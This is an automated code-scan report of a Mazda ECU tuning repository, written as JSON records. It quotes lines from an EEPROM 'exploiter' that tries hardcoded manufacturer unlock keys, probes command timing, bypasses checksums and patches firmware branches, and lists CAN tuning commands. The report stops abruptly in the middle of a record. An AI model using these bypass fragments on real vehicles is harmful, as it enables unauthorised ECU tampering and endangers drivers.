{"file_path": "ARCHITECTURE.md", "lines_read": 10, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ARCHITECTURE_DIAGRAM.txt", "lines_read": 29, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "BUILD_INSTRUCTIONS.md", "lines_read": 95, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "COMPLETE_IMPLEMENTATION_LIST.md", "lines_read": 1197, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "CONTRIBUTING.md", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "ECU_PROTOCOLS.md", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "EEPROMExploiter.py", "lines_read": 677, "features_found": [{"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "functools", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "IntEnum,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Optional,", "line": null}, {"type": "import", "module": "wraps", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "binascii", "line": null}], "components_found": [], "algorithms": [], "protocols": [{"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "def __init__(self, model: str, page_size: int = 64, total_size: int = 0x2000):"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "self.add_region(\"BOOTLOADER\", 0x0000, 0x0FFF, True, False, \"Bootloader section\")"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "self.add_region(\"FIRMWARE\", 0x1000, 0x1EFF, True, False, \"Main firmware\")"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "self.add_region(\"CONFIG\", 0x1F00, 0x1F7F, True, True, \"Configuration area\")"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "self.add_region(\"SECURITY\", 0x1F80, 0x1FFF, False, False, \"Security registers\")"}, {"type": "protocol", "line": 205, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x4D, 0x41, 0x5A, 0x44, 0x41, 0x5F, 0x4D, 0x46]),  # MAZDA_MF"}, {"type": "protocol", "line": 206, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x4D, 0x5A, 0x44, 0x45, 0x41, 0x4C, 0x45, 0x52]),  # MZDEALER"}, {"type": "protocol", "line": 207, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x53, 0x45, 0x43, 0x52, 0x45, 0x54, 0x4B, 0x45]),  # SECRETKE"}, {"type": "protocol", "line": 208, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x4D, 0x4E, 0x46, 0x54, 0x50, 0x41, 0x53, 0x53]),  # MNFTPASS"}, {"type": "protocol", "line": 235, "protocol": "0x[0-9A-Fa-f]+", "content": "response = await self.transport.send_command(0x4D, key)"}, {"type": "protocol", "line": 236, "protocol": "0x[0-9A-Fa-f]+", "content": "return len(response) > 0 and response[0] == 0xAA"}, {"type": "protocol", "line": 245, "protocol": "0x[0-9A-Fa-f]+", "content": "base_time = await self._measure_command_time(0x00, b\"\\x00\")"}, {"type": "protocol", "line": 248, "protocol": "0x[0-9A-Fa-f]+", "content": "for cmd in range(0x40, 0x50):"}, {"type": "protocol", "line": 324, "protocol": "0x[0-9A-Fa-f]+", "content": "chunk_size = 0x100"}, {"type": "protocol", "line": 443, "protocol": "0x[0-9A-Fa-f]+", "content": "counter_addr = 0x1FF0"}, {"type": "protocol", "line": 480, "protocol": "0x[0-9A-Fa-f]+", "content": "fault_history_start = 0x1E00"}, {"type": "protocol", "line": 481, "protocol": "0x[0-9A-Fa-f]+", "content": "fault_history_size = 0x100  # 256 bytes"}, {"type": "protocol", "line": 492, "protocol": "0x[0-9A-Fa-f]+", "content": "if all(b == 0xFF for b in first_block):"}, {"type": "protocol", "line": 569, "protocol": "0x[0-9A-Fa-f]+", "content": "if offset > 0x7FF or offset < -0x800:"}, {"type": "protocol", "line": 574, "protocol": "0x[0-9A-Fa-f]+", "content": "branch_instr = ((0xF000 | ((offset >> 11) & 0x7FF)) << 16) | (0xF800 | (offset & 0x7FF))"}, {"type": "protocol", "line": 589, "protocol": "0x[0-9A-Fa-f]+", "content": "Find a block of empty (0xFF) space in memory."}, {"type": "protocol", "line": 599, "protocol": "0x[0-9A-Fa-f]+", "content": "chunk_size = 0x100  # Search in chunks to be efficient"}, {"type": "protocol", "line": 607, "protocol": "0x[0-9A-Fa-f]+", "content": "if all(b == 0xFF for b in chunk[i:i+size]):"}, {"type": "protocol", "line": 650, "protocol": "0x[0-9A-Fa-f]+", "content": "memory_map = EEPROMMemoryMap(\"mazda_mx5_2016\", page_size=64, total_size=0x2000)"}, {"type": "protocol", "line": 658, "protocol": "0x[0-9A-Fa-f]+", "content": "if await exploiter.bypass_checksum(0x1FFE):"}], "hardware_assumptions": [{"type": "hardware", "line": 27, "hardware": "ECU", "content": "class SecurityError(EEPROMError):"}, {"type": "hardware", "line": 28, "hardware": "ECU", "content": "\"\"\"Raised when a security check fails.\"\"\""}, {"type": "hardware", "line": 73, "hardware": "ECU", "content": "self.add_region(\"SECURITY\", 0x1F80, 0x1FFF, False, False, \"Security registers\")"}, {"type": "hardware", "line": 101, "hardware": "ECU", "content": "class SecurityState(IntEnum):"}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "\"\"\"EEPROM security states.\"\"\""}, {"type": "hardware", "line": 130, "hardware": "ECU", "content": "self.security_state = SecurityState.LOCKED"}, {"type": "hardware", "line": 175, "hardware": "ECU", "content": "self.security_state = SecurityState.UNLOCKED"}, {"type": "hardware", "line": 200, "hardware": "ECU", "content": "self.security_state = SecurityState.MANUFACTURER_MODE"}, {"type": "hardware", "line": 214, "hardware": "ECU", "content": "self.security_state = SecurityState.MANUFACTURER_MODE"}, {"type": "hardware", "line": 221, "hardware": "ECU", "content": "self.security_state = SecurityState.MANUFACTURER_MODE"}, {"type": "hardware", "line": 264, "hardware": "ECU", "content": "\"\"\"Measure the time taken to execute a command.\"\"\""}, {"type": "hardware", "line": 354, "hardware": "ECU", "content": "SecurityError: If the address is not readable"}, {"type": "hardware", "line": 357, "hardware": "ECU", "content": "raise SecurityError(f\"Address 0x{address:04X} is not readable\")"}, {"type": "hardware", "line": 376, "hardware": "ECU", "content": "SecurityError: If the address is not writable or not in manufacturer mode"}, {"type": "hardware", "line": 379, "hardware": "ECU", "content": "raise SecurityError(\"Manufacturer mode required for direct memory write\")"}, {"type": "hardware", "line": 382, "hardware": "ECU", "content": "raise SecurityError(f\"Address 0x{address:04X} is not writable\")"}, {"type": "hardware", "line": 617, "hardware": "ABS", "content": "\"\"\"Abstract base class for EEPROM transport implementations.\"\"\""}], "security_logic": [{"type": "security_pattern", "line": 15, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 82, "pattern": "key", "content": "self.regions.sort(key=lambda r: r.start)"}, {"type": "security_pattern", "line": 163, "pattern": "key", "content": "async def unlock(self, key: bytes) -> bool:"}, {"type": "security_pattern", "line": 165, "pattern": "key", "content": "Unlock the EEPROM with the provided key."}, {"type": "security_pattern", "line": 168, "pattern": "key", "content": "key: The unlock key (length depends on EEPROM model)"}, {"type": "security_pattern", "line": 174, "pattern": "key", "content": "await self.transport.send_unlock_key(key)"}, {"type": "security_pattern", "line": 182, "pattern": "key", "content": "async def enter_manufacturer_mode(self, override_key: Optional[bytes] = None) -> bool:"}, {"type": "security_pattern", "line": 184, "pattern": "key", "content": "Enter manufacturer mode using known vulnerabilities or override key."}, {"type": "security_pattern", "line": 187, "pattern": "key", "content": "override_key: Optional manufacturer key to use"}, {"type": "security_pattern", "line": 196, "pattern": "key", "content": "if override_key:"}, {"type": "security_pattern", "line": 198, "pattern": "key", "content": "if await self._try_manufacturer_key(override_key):"}, {"type": "security_pattern", "line": 204, "pattern": "key", "content": "known_keys = ["}, {"type": "security_pattern", "line": 211, "pattern": "key", "content": "for key in known_keys:"}, {"type": "security_pattern", "line": 212, "pattern": "key", "content": "if await self._try_manufacturer_key(key):"}, {"type": "security_pattern", "line": 215, "pattern": "key", "content": "self.logger.info(\"Entered manufacturer mode using known key\")"}, {"type": "security_pattern", "line": 231, "pattern": "key", "content": "async def _try_manufacturer_key(self, key: bytes) -> bool:"}, {"type": "security_pattern", "line": 232, "pattern": "key", "content": "\"\"\"Try a manufacturer key and return success status.\"\"\""}, {"type": "security_pattern", "line": 235, "pattern": "key", "content": "response = await self.transport.send_command(0x4D, key)"}, {"type": "security_pattern", "line": 639, "pattern": "key", "content": "async def send_unlock_key(self, key: bytes) -> bool:"}, {"type": "security_pattern", "line": 640, "pattern": "key", "content": "\"\"\"Send an unlock key to the EEPROM.\"\"\""}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "LICENSE", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "MAPS_REFERENCE.md", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "MUTS_CROSS_FILE_ANALYSIS.md", "lines_read": 191, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "MUTS_Technical_Spec.pdf", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["muts"]}
{"file_path": "MUTS_Technical_Spec_FULL.pdf", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["muts"]}
{"file_path": "Makefile", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "MazdaCANEngine.py", "lines_read": 495, "features_found": [{"type": "function", "name": "__init__", "line": 68}, {"type": "function", "name": "connect", "line": 131}, {"type": "function", "name": "disconnect", "line": 146}, {"type": "function", "name": "start_monitoring", "line": 151}, {"type": "function", "name": "stop_monitoring", "line": 165}, {"type": "function", "name": "register_callback", "line": 173}, {"type": "function", "name": "unregister_callback", "line": 181}, {"type": "function", "name": "send_can_message", "line": 189}, {"type": "function", "name": "_monitor_loop", "line": 219}, {"type": "function", "name": "_process_can_data", "line": 248}, {"type": "function", "name": "_handle_engine_data", "line": 289}, {"type": "function", "name": "_handle_engine_data2", "line": 305}, {"type": "function", "name": "_handle_tcm_data", "line": 320}, {"type": "function", "name": "_handle_dsc_data", "line": 336}, {"type": "function", "name": "get_vehicle_state", "line": 347}, {"type": "function", "name": "get_engine_parameters", "line": 352}, {"type": "function", "name": "get_transmission_parameters", "line": 370}, {"type": "function", "name": "get_system_status", "line": 381}, {"type": "function", "name": "enable_launch_control", "line": 393}, {"type": "function", "name": "disable_launch_control", "line": 402}, {"type": "function", "name": "enable_flat_shift", "line": 407}, {"type": "function", "name": "disable_flat_shift", "line": 415}, {"type": "function", "name": "enable_rolling_anti_lag", "line": 420}, {"type": "function", "name": "enable_pop_bang", "line": 425}, {"type": "function", "name": "enable_two_step", "line": 430}, {"type": "function", "name": "disable_two_step", "line": 438}, {"type": "function", "name": "enable_stealth_mode", "line": 443}, {"type": "function", "name": "can_message_callback", "line": 453}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "MazdaOBDService", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "OBDService,", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "sys", "line": null}], "components_found": [{"type": "class", "name": "MazdaCANError", "line": 22}, {"type": "class", "name": "CANMessageID", "line": 26}, {"type": "class", "name": "MazdaCANEngine", "line": 60}], "algorithms": [], "protocols": [{"type": "protocol", "line": 2, "protocol": "CAN", "content": "MazdaCANEngine - Advanced CAN communication module for Mazdaspeed 3."}, {"type": "protocol", "line": 4, "protocol": "CAN", "content": "This module provides Mazda-specific CAN communication functionality,"}, {"type": "protocol", "line": 5, "protocol": "OBD", "content": "extending the base OBD-II capabilities with Mazda-specific protocols"}, {"type": "protocol", "line": 17, "protocol": "OBD", "content": "from MazdaOBDService import OBDService, OBDProtocol, OBDServiceError"}, {"type": "protocol", "line": 20, "protocol": "CAN", "content": "logger = logging.getLogger('MazdaCANEngine')"}, {"type": "protocol", "line": 22, "protocol": "CAN", "content": "class MazdaCANError(OBDServiceError):"}, {"type": "protocol", "line": 22, "protocol": "OBD", "content": "class MazdaCANError(OBDServiceError):"}, {"type": "protocol", "line": 23, "protocol": "CAN", "content": "\"\"\"Base exception for Mazda CAN communication errors.\"\"\""}, {"type": "protocol", "line": 26, "protocol": "CAN", "content": "class CANMessageID(IntEnum):"}, {"type": "protocol", "line": 27, "protocol": "CAN", "content": "\"\"\"Mazda-specific CAN message IDs.\"\"\""}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "ECM_ENGINE_DATA = 0x201"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "ECM_ENGINE_DATA2 = 0x240"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "ECM_ENGINE_DATA3 = 0x280"}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "ECM_ENGINE_DATA4 = 0x2C0"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "TCM_DATA = 0x202"}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "TCM_DATA2 = 0x212"}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "DSC_DATA = 0x215"}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "DSC_DATA2 = 0x217"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "EPS_DATA = 0x220"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "IC_DATA = 0x2F0"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "IC_DATA2 = 0x2F1"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "BCM_DATA = 0x300"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "BCM_DATA2 = 0x301"}, {"type": "protocol", "line": 54, "protocol": "0x[0-9A-Fa-f]+", "content": "CLIMATE_DATA = 0x440"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "TUNING_COMMAND = 0x7E0"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "TUNING_RESPONSE = 0x7E8"}, {"type": "protocol", "line": 60, "protocol": "CAN", "content": "class MazdaCANEngine:"}, {"type": "protocol", "line": 62, "protocol": "CAN", "content": "Advanced CAN communication handler for Mazdaspeed 3."}, {"type": "protocol", "line": 64, "protocol": "OBD", "content": "This class extends the base OBDService with Mazda-specific"}, {"type": "protocol", "line": 65, "protocol": "CAN", "content": "CAN communication features and protocols."}, {"type": "protocol", "line": 68, "protocol": "OBD", "content": "def __init__(self, obd_service: Optional[OBDService] = None):"}, {"type": "protocol", "line": 70, "protocol": "CAN", "content": "Initialize the Mazda CAN engine."}, {"type": "protocol", "line": 73, "protocol": "OBD", "content": "obd_service: Optional pre-configured OBDService instance"}, {"type": "protocol", "line": 75, "protocol": "OBD", "content": "self.obd = obd_service or OBDService()"}, {"type": "protocol", "line": 85, "protocol": "CAN", "content": "CANMessageID.ECM_ENGINE_DATA: self._handle_engine_data,"}, {"type": "protocol", "line": 86, "protocol": "CAN", "content": "CANMessageID.ECM_ENGINE_DATA2: self._handle_engine_data2,"}, {"type": "protocol", "line": 87, "protocol": "CAN", "content": "CANMessageID.TCM_DATA: self._handle_tcm_data,"}, {"type": "protocol", "line": 88, "protocol": "CAN", "content": "CANMessageID.DSC_DATA: self._handle_dsc_data,"}, {"type": "protocol", "line": 132, "protocol": "CAN", "content": "\"\"\"Connect to the vehicle's CAN bus.\"\"\""}, {"type": "protocol", "line": 137, "protocol": "OBD", "content": "if self.obd.connection.protocol == OBDProtocol.AUTO:"}, {"type": "protocol", "line": 139, "protocol": "CAN", "content": "if not self.obd.connection.set_protocol(OBDProtocol.ISO_15765_4_CAN_11B_500K):"}, {"type": "protocol", "line": 139, "protocol": "OBD", "content": "if not self.obd.connection.set_protocol(OBDProtocol.ISO_15765_4_CAN_11B_500K):"}, {"type": "protocol", "line": 140, "protocol": "CAN", "content": "logger.error(\"Failed to set CAN protocol\")"}, {"type": "protocol", "line": 143, "protocol": "CAN", "content": "logger.info(\"Connected to Mazda CAN bus\")"}, {"type": "protocol", "line": 147, "protocol": "CAN", "content": "\"\"\"Disconnect from the vehicle's CAN bus.\"\"\""}, {"type": "protocol", "line": 152, "protocol": "CAN", "content": "\"\"\"Start monitoring CAN bus messages.\"\"\""}, {"type": "protocol", "line": 160, "protocol": "CAN", "content": "name=\"MazdaCANMonitor\""}, {"type": "protocol", "line": 163, "protocol": "CAN", "content": "logger.info(\"Started CAN bus monitoring\")"}, {"type": "protocol", "line": 166, "protocol": "CAN", "content": "\"\"\"Stop monitoring CAN bus messages.\"\"\""}, {"type": "protocol", "line": 171, "protocol": "CAN", "content": "logger.info(\"Stopped CAN bus monitoring\")"}, {"type": "protocol", "line": 174, "protocol": "CAN", "content": "\"\"\"Register a callback for a specific CAN ID.\"\"\""}, {"type": "protocol", "line": 182, "protocol": "CAN", "content": "\"\"\"Unregister a callback for a specific CAN ID.\"\"\""}, {"type": "protocol", "line": 191, "protocol": "CAN", "content": "Send a raw CAN message."}, {"type": "protocol", "line": 194, "protocol": "CAN", "content": "can_id: CAN message ID"}, {"type": "protocol", "line": 202, "protocol": "CAN", "content": "raise MazdaCANError(\"Not connected to CAN bus\")"}, {"type": "protocol", "line": 205, "protocol": "CAN", "content": "raise ValueError(\"CAN message data cannot exceed 8 bytes\")"}, {"type": "protocol", "line": 220, "protocol": "CAN", "content": "\"\"\"Main CAN bus monitoring loop.\"\"\""}, {"type": "protocol", "line": 241, "protocol": "CAN", "content": "logger.error(f\"Error in CAN monitor loop: {e}\")"}, {"type": "protocol", "line": 245, "protocol": "CAN", "content": "logger.critical(f\"Fatal error in CAN monitor loop: {e}\")"}, {"type": "protocol", "line": 249, "protocol": "CAN", "content": "\"\"\"Process raw CAN data.\"\"\""}, {"type": "protocol", "line": 275, "protocol": "CAN", "content": "logger.error(f\"Error in CAN callback: {e}\")"}, {"type": "protocol", "line": 282, "protocol": "CAN", "content": "logger.error(f\"Error handling CAN message 0x{can_id:03X}: {e}\")"}, {"type": "protocol", "line": 285, "protocol": "CAN", "content": "logger.error(f\"Error processing CAN data: {e}\")"}, {"type": "protocol", "line": 290, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Handle ECM engine data messages (0x201).\"\"\""}, {"type": "protocol", "line": 306, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Handle secondary ECM engine data messages (0x240).\"\"\""}, {"type": "protocol", "line": 321, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Handle TCM data messages (0x202).\"\"\""}, {"type": "protocol", "line": 326, "protocol": "0x[0-9A-Fa-f]+", "content": "self.vehicle_state['current_gear'] = data[0] & 0x0F"}, {"type": "protocol", "line": 327, "protocol": "0x[0-9A-Fa-f]+", "content": "self.vehicle_state['target_gear'] = (data[0] >> 4) & 0x0F"}, {"type": "protocol", "line": 328, "protocol": "0x[0-9A-Fa-f]+", "content": "self.vehicle_state['clutch_switch'] = bool(data[1] & 0x01)"}, {"type": "protocol", "line": 329, "protocol": "0x[0-9A-Fa-f]+", "content": "self.vehicle_state['brake_switch'] = bool(data[1] & 0x02)"}, {"type": "protocol", "line": 330, "protocol": "0x[0-9A-Fa-f]+", "content": "self.vehicle_state['cruise_control'] = bool(data[1] & 0x04)"}, {"type": "protocol", "line": 337, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Handle DSC (stability control) data messages (0x215).\"\"\""}, {"type": "protocol", "line": 342, "protocol": "0x[0-9A-Fa-f]+", "content": "self.vehicle_state['dsc_active'] = bool(data[0] & 0x01)"}, {"type": "protocol", "line": 343, "protocol": "0x[0-9A-Fa-f]+", "content": "self.vehicle_state['traction_control_active'] = bool(data[0] & 0x02)"}, {"type": "protocol", "line": 399, "protocol": "0x[0-9A-Fa-f]+", "content": "data = struct.pack('>BH', 0x01, rpm_limit) + bytes(5)"}, {"type": "protocol", "line": 400, "protocol": "CAN", "content": "return self.send_can_message(CANMessageID.TUNING_COMMAND, data)"}, {"type": "protocol", "line": 404, "protocol": "0x[0-9A-Fa-f]+", "content": "data = bytes([0x81]) + bytes(7)"}, {"type": "protocol", "line": 405, "protocol": "CAN", "content": "return self.send_can_message(CANMessageID.TUNING_COMMAND, data)"}, {"type": "protocol", "line": 412, "protocol": "0x[0-9A-Fa-f]+", "content": "data = struct.pack('>BH', 0x02, rpm_limit) + bytes(5)"}, {"type": "protocol", "line": 413, "protocol": "CAN", "content": "return self.send_can_message(CANMessageID.TUNING_COMMAND, data)"}, {"type": "protocol", "line": 417, "protocol": "0x[0-9A-Fa-f]+", "content": "data = bytes([0x82]) + bytes(7)"}, {"type": "protocol", "line": 418, "protocol": "CAN", "content": "return self.send_can_message(CANMessageID.TUNING_COMMAND, data)"}, {"type": "protocol", "line": 422, "protocol": "0x[0-9A-Fa-f]+", "content": "data = bytes([0x03, 0x01 if enable else 0x00]) + bytes(6)"}, {"type": "protocol", "line": 423, "protocol": "CAN", "content": "return self.send_can_message(CANMessageID.TUNING_COMMAND, data)"}, {"type": "protocol", "line": 427, "protocol": "0x[0-9A-Fa-f]+", "content": "data = bytes([0x04, 0x01 if enable else 0x00]) + bytes(6)"}, {"type": "protocol", "line": 428, "protocol": "CAN", "content": "return self.send_can_message(CANMessageID.TUNING_COMMAND, data)"}, {"type": "protocol", "line": 435, "protocol": "0x[0-9A-Fa-f]+", "content": "data = struct.pack('>BHH', 0x05, launch_rpm, burnout_rpm) + bytes(3)"}, {"type": "protocol", "line": 436, "protocol": "CAN", "content": "return self.send_can_message(CANMessageID.TUNING_COMMAND, data)"}, {"type": "protocol", "line": 440, "protocol": "0x[0-9A-Fa-f]+", "content": "data = bytes([0x85]) + bytes(7)"}, {"type": "protocol", "line": 441, "protocol": "CAN", "content": "return self.send_can_message(CANMessageID.TUNING_COMMAND, data)"}, {"type": "protocol", "line": 445, "protocol": "0x[0-9A-Fa-f]+", "content": "data = bytes([0x06, 0x01 if enable else 0x00]) + bytes(6)"}, {"type": "protocol", "line": 446, "protocol": "CAN", "content": "return self.send_can_message(CANMessageID.TUNING_COMMAND, data)"}, {"type": "protocol", "line": 454, "protocol": "CAN", "content": "\"\"\"Example callback for CAN messages.\"\"\""}, {"type": "protocol", "line": 455, "protocol": "CAN", "content": "print(f\"CAN ID: 0x{can_id:03X}, Data: {data.hex(' ')}\")"}, {"type": "protocol", "line": 459, "protocol": "CAN", "content": "print(\"Initializing Mazda CAN Engine...\")"}, {"type": "protocol", "line": 460, "protocol": "CAN", "content": "mazda = MazdaCANEngine()"}, {"type": "protocol", "line": 468, "protocol": "CAN", "content": "mazda.register_callback(CANMessageID.ECM_ENGINE_DATA, can_message_callback)"}, {"type": "protocol", "line": 469, "protocol": "CAN", "content": "mazda.register_callback(CANMessageID.ECM_ENGINE_DATA2, can_message_callback)"}, {"type": "protocol", "line": 472, "protocol": "CAN", "content": "print(\"Starting CAN bus monitoring...\")"}], "hardware_assumptions": [{"type": "hardware", "line": 35, "hardware": "TCM", "content": "TCM_DATA = 0x202"}, {"type": "hardware", "line": 36, "hardware": "TCM", "content": "TCM_DATA2 = 0x212"}, {"type": "hardware", "line": 50, "hardware": "BCM", "content": "BCM_DATA = 0x300"}, {"type": "hardware", "line": 51, "hardware": "BCM", "content": "BCM_DATA2 = 0x301"}, {"type": "hardware", "line": 87, "hardware": "TCM", "content": "CANMessageID.TCM_DATA: self._handle_tcm_data,"}, {"type": "hardware", "line": 92, "hardware": "vehicle", "content": "self.vehicle_state = {"}, {"type": "hardware", "line": 132, "hardware": "CAN bus", "content": "\"\"\"Connect to the vehicle's CAN bus.\"\"\""}, {"type": "hardware", "line": 132, "hardware": "vehicle", "content": "\"\"\"Connect to the vehicle's CAN bus.\"\"\""}, {"type": "hardware", "line": 143, "hardware": "CAN bus", "content": "logger.info(\"Connected to Mazda CAN bus\")"}, {"type": "hardware", "line": 147, "hardware": "CAN bus", "content": "\"\"\"Disconnect from the vehicle's CAN bus.\"\"\""}, {"type": "hardware", "line": 147, "hardware": "vehicle", "content": "\"\"\"Disconnect from the vehicle's CAN bus.\"\"\""}, {"type": "hardware", "line": 152, "hardware": "CAN bus", "content": "\"\"\"Start monitoring CAN bus messages.\"\"\""}, {"type": "hardware", "line": 163, "hardware": "CAN bus", "content": "logger.info(\"Started CAN bus monitoring\")"}, {"type": "hardware", "line": 166, "hardware": "CAN bus", "content": "\"\"\"Stop monitoring CAN bus messages.\"\"\""}, {"type": "hardware", "line": 171, "hardware": "CAN bus", "content": "logger.info(\"Stopped CAN bus monitoring\")"}, {"type": "hardware", "line": 202, "hardware": "CAN bus", "content": "raise MazdaCANError(\"Not connected to CAN bus\")"}, {"type": "hardware", "line": 220, "hardware": "CAN bus", "content": "\"\"\"Main CAN bus monitoring loop.\"\"\""}, {"type": "hardware", "line": 295, "hardware": "vehicle", "content": "self.vehicle_state['rpm'] = ((data[0] << 8) | data[1]) / 4.0"}, {"type": "hardware", "line": 296, "hardware": "vehicle", "content": "self.vehicle_state['speed'] = data[2]  # km/h"}, {"type": "hardware", "line": 297, "hardware": "vehicle", "content": "self.vehicle_state['throttle'] = (data[3] * 100.0) / 255.0  # %"}, {"type": "hardware", "line": 298, "hardware": "vehicle", "content": "self.vehicle_state['coolant_temp'] = data[4] - 40.0  # \u00b0C"}, {"type": "hardware", "line": 299, "hardware": "vehicle", "content": "self.vehicle_state['intake_temp'] = data[5] - 40.0  # \u00b0C"}, {"type": "hardware", "line": 300, "hardware": "vehicle", "content": "self.vehicle_state['maf'] = ((data[6] << 8) | data[7]) / 100.0  # g/s"}, {"type": "hardware", "line": 303, "hardware": "vehicle", "content": "self.vehicle_state['last_update'] = time.time()"}, {"type": "hardware", "line": 311, "hardware": "vehicle", "content": "self.vehicle_state['ignition_timing'] = (data[0] / 2.0) - 64.0  # degrees"}, {"type": "hardware", "line": 312, "hardware": "vehicle", "content": "self.vehicle_state['battery_voltage'] = data[1] / 10.0  # volts"}, {"type": "hardware", "line": 313, "hardware": "vehicle", "content": "self.vehicle_state['afr'] = data[2] / 10.0  # AFR"}, {"type": "hardware", "line": 314, "hardware": "vehicle", "content": "self.vehicle_state['boost'] = ((data[3] - 128) * 0.019) * 14.5038  # PSI (converted from bar)"}, {"type": "hardware", "line": 315, "hardware": "vehicle", "content": "self.vehicle_state['wastegate_duty'] = data[4] * 0.39215686  # %"}, {"type": "hardware", "line": 316, "hardware": "vehicle", "content": "self.vehicle_state['ethanol_percent'] = data[5]  # %"}, {"type": "hardware", "line": 317, "hardware": "vehicle", "content": "self.vehicle_state['knock_count'] = data[6]"}, {"type": "hardware", "line": 318, "hardware": "vehicle", "content": "self.vehicle_state['knock_retard'] = data[7] * 0.5  # degrees"}, {"type": "hardware", "line": 320, "hardware": "TCM", "content": "def _handle_tcm_data(self, can_id: int, data: bytes) -> None:"}, {"type": "hardware", "line": 321, "hardware": "TCM", "content": "\"\"\"Handle TCM data messages (0x202).\"\"\""}, {"type": "hardware", "line": 326, "hardware": "vehicle", "content": 